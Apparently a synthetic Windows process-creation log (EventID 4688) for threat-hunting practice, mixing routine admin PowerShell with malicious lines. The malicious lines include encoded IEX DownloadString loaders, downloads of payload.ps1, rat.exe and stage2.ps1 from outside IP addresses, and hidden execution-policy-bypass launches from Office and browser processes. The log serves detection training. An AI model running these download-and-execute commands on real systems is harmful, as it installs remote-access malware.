2026-04-16T08:17:47 WS-FINANCE-01 EventID=4688 User=IT_Admin ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Get-EventLog -LogName System -Newest 10"
2026-04-16T08:21:16 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T08:21:24 WS-SARAH-01 EventID=4688 User=sarah.kwame ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\malware.ps1"
2026-04-16T08:31:45 WS-SARAH-01 EventID=4688 User=sarah.kwame ParentProcess=excel.exe Process=powershell.exe CommandLine="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
2026-04-16T08:32:24 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=invoice_setup.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T08:35:26 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-EventLog -LogName System -Newest 10"
2026-04-16T08:56:42 WS-OPS-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T08:59:45 WS-OPS-01 EventID=4688 User=sarah.kwame ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Set-ExecutionPolicy RemoteSigned"
2026-04-16T09:10:28 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=invoice_setup.exe Process=powershell.exe CommandLine="powershell.exe -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAA="
2026-04-16T09:11:08 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T09:11:26 WS-DANIEL-01 EventID=4688 User=IT_Admin ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-Process"
2026-04-16T09:13:12 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T09:13:22 WS-FINANCE-01 EventID=4688 User=sarah.kwame ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Update-Help"
2026-04-16T09:13:51 WS-SARAH-01 EventID=4688 User=SYSTEM ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-Process"
2026-04-16T09:14:06 FS-PROD-01 EventID=4688 User=IT_Admin ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T09:24:25 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T09:30:48 WS-OPS-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T09:31:18 WS-OPS-01 EventID=4688 User=daniel.asante ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T09:33:06 FS-PROD-01 EventID=4688 User=IT_Admin ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T09:34:47 WS-FINANCE-01 EventID=4688 User=sarah.kwame ParentProcess=winword.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T09:39:45 FS-PROD-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T09:40:13 WS-FINANCE-01 EventID=4688 User=SYSTEM ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T09:40:32 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=winword.exe Process=powershell.exe CommandLine="powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://185.220.101.45/rat.exe','C:\Temp\rat.exe')"
2026-04-16T09:48:37 FS-PROD-01 EventID=4688 User=sarah.kwame ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T09:56:11 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=svchost32.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T10:06:44 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T10:07:30 WS-OPS-01 EventID=4688 User=SYSTEM ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T10:08:09 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=winword.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T10:08:47 FS-PROD-01 EventID=4688 User=sarah.kwame ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Set-ExecutionPolicy RemoteSigned"
2026-04-16T10:09:06 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=excel.exe Process=powershell.exe CommandLine="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
2026-04-16T10:16:53 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=invoice_setup.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T10:19:39 WS-FINANCE-01 EventID=4688 User=IT_Admin ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T10:22:40 WS-DANIEL-01 EventID=4688 User=IT_Admin ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Set-ExecutionPolicy RemoteSigned"
2026-04-16T10:35:05 WS-SARAH-01 EventID=4688 User=sarah.kwame ParentProcess=excel.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T10:37:46 WS-SARAH-01 EventID=4688 User=sarah.kwame ParentProcess=svchost32.exe Process=powershell.exe CommandLine="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage2.ps1')"
2026-04-16T10:44:47 FS-PROD-01 EventID=4688 User=daniel.asante ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Update-Help"
2026-04-16T10:50:02 WS-FINANCE-01 EventID=4688 User=sarah.kwame ParentProcess=winword.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T10:59:47 WS-SARAH-01 EventID=4688 User=SYSTEM ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T11:00:26 WS-DANIEL-01 EventID=4688 User=sarah.kwame ParentProcess=svchost32.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T11:02:46 WS-DANIEL-01 EventID=4688 User=SYSTEM ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-EventLog -LogName System -Newest 10"
2026-04-16T11:02:56 WS-DANIEL-01 EventID=4688 User=sarah.kwame ParentProcess=excel.exe Process=powershell.exe CommandLine="powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\malware.ps1"
2026-04-16T11:05:29 WS-SARAH-01 EventID=4688 User=sarah.kwame ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T11:07:42 FS-PROD-01 EventID=4688 User=SYSTEM ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Get-Process"
2026-04-16T11:14:37 WS-SARAH-01 EventID=4688 User=sarah.kwame ParentProcess=excel.exe Process=powershell.exe CommandLine="powershell.exe -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAA="
2026-04-16T11:18:09 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=excel.exe Process=powershell.exe CommandLine="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
2026-04-16T11:19:58 WS-FINANCE-01 EventID=4688 User=SYSTEM ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T11:22:50 WS-DANIEL-01 EventID=4688 User=sarah.kwame ParentProcess=svchost32.exe Process=powershell.exe CommandLine="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
2026-04-16T11:26:38 WS-DANIEL-01 EventID=4688 User=sarah.kwame ParentProcess=winword.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T11:38:18 WS-DANIEL-01 EventID=4688 User=SYSTEM ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T11:40:18 FS-PROD-01 EventID=4688 User=daniel.asante ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T11:51:58 WS-FINANCE-01 EventID=4688 User=SYSTEM ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Get-Process"
2026-04-16T12:03:25 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T12:10:51 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=winword.exe Process=powershell.exe CommandLine="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
2026-04-16T12:17:02 WS-SARAH-01 EventID=4688 User=SYSTEM ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Set-ExecutionPolicy RemoteSigned"
2026-04-16T12:18:03 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=svchost32.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T12:20:32 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=excel.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T12:22:30 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=invoice_setup.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T12:30:44 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Update-Help"
2026-04-16T12:36:11 WS-FINANCE-01 EventID=4688 User=sarah.kwame ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T12:48:52 WS-DANIEL-01 EventID=4688 User=sarah.kwame ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
2026-04-16T12:49:11 WS-DANIEL-01 EventID=4688 User=IT_Admin ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Update-Help"
2026-04-16T12:49:33 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAA="
2026-04-16T12:52:22 WS-SARAH-01 EventID=4688 User=IT_Admin ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-EventLog -LogName System -Newest 10"
2026-04-16T12:52:27 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T13:02:37 WS-FINANCE-01 EventID=4688 User=sarah.kwame ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T13:04:04 WS-OPS-01 EventID=4688 User=SYSTEM ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Set-ExecutionPolicy RemoteSigned"
2026-04-16T13:13:57 FS-PROD-01 EventID=4688 User=daniel.asante ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T13:23:49 WS-FINANCE-01 EventID=4688 User=SYSTEM ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-EventLog -LogName System -Newest 10"
2026-04-16T13:24:52 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T13:36:22 FS-PROD-01 EventID=4688 User=IT_Admin ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T13:40:49 FS-PROD-01 EventID=4688 User=SYSTEM ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Set-ExecutionPolicy RemoteSigned"
2026-04-16T13:56:03 FS-PROD-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Set-ExecutionPolicy RemoteSigned"
2026-04-16T13:56:04 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Update-Help"
2026-04-16T13:59:07 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=svchost32.exe Process=powershell.exe CommandLine="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage2.ps1')"
2026-04-16T14:10:24 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=invoice_setup.exe Process=powershell.exe CommandLine="powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\malware.ps1"
2026-04-16T14:13:32 WS-OPS-01 EventID=4688 User=daniel.asante ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T14:15:12 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T14:17:24 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage2.ps1')"
2026-04-16T14:19:14 WS-FINANCE-01 EventID=4688 User=sarah.kwame ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAA="
2026-04-16T14:24:58 WS-DANIEL-01 EventID=4688 User=sarah.kwame ParentProcess=excel.exe Process=powershell.exe CommandLine="powershell.exe Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\Public\svchost32.exe"
2026-04-16T14:25:41 FS-PROD-01 EventID=4688 User=sarah.kwame ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-Process"
2026-04-16T14:30:35 WS-SARAH-01 EventID=4688 User=SYSTEM ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T14:34:32 FS-PROD-01 EventID=4688 User=SYSTEM ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T14:37:05 WS-OPS-01 EventID=4688 User=IT_Admin ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-EventLog -LogName System -Newest 10"
2026-04-16T14:40:35 WS-DANIEL-01 EventID=4688 User=sarah.kwame ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T14:58:06 FS-PROD-01 EventID=4688 User=SYSTEM ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T15:02:47 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=winword.exe Process=powershell.exe CommandLine="powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\malware.ps1"
2026-04-16T15:08:19 WS-OPS-01 EventID=4688 User=IT_Admin ParentProcess=powershell_ise.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T15:10:24 WS-SARAH-01 EventID=4688 User=SYSTEM ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Set-ExecutionPolicy RemoteSigned"
2026-04-16T15:10:57 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=winword.exe Process=powershell.exe CommandLine="powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\malware.ps1"
2026-04-16T15:12:40 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=invoice_setup.exe Process=powershell.exe CommandLine="powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\malware.ps1"
2026-04-16T15:13:04 WS-DANIEL-01 EventID=4688 User=daniel.asante ParentProcess=invoice_setup.exe Process=powershell.exe CommandLine="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgA0ADAALgAxADEAOAAuADEANwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
2026-04-16T15:18:35 WS-SARAH-01 EventID=4688 User=SYSTEM ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-Service"
2026-04-16T15:23:55 WS-OPS-01 EventID=4688 User=daniel.asante ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T15:28:34 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=chrome.exe Process=powershell.exe CommandLine="powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://185.220.101.45/rat.exe','C:\Temp\rat.exe')"
2026-04-16T15:43:02 WS-OPS-01 EventID=4688 User=daniel.asante ParentProcess=services.exe Process=powershell.exe CommandLine="powershell.exe Get-ChildItem C:\Windows\System32"
2026-04-16T15:44:39 WS-SARAH-01 EventID=4688 User=daniel.asante ParentProcess=cmd.exe Process=powershell.exe CommandLine="powershell.exe Get-WmiObject Win32_ComputerSystem"
2026-04-16T15:48:41 WS-FINANCE-01 EventID=4688 User=daniel.asante ParentProcess=invoice_setup.exe Process=powershell.exe CommandLine="powershell.exe -nop -noni -w hidden -enc cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwA="
2026-04-16T15:49:14 FS-PROD-01 EventID=4688 User=sarah.kwame ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Update-Help"
2026-04-16T15:59:45 WS-DANIEL-01 EventID=4688 User=SYSTEM ParentProcess=explorer.exe Process=powershell.exe CommandLine="powershell.exe Get-Process"
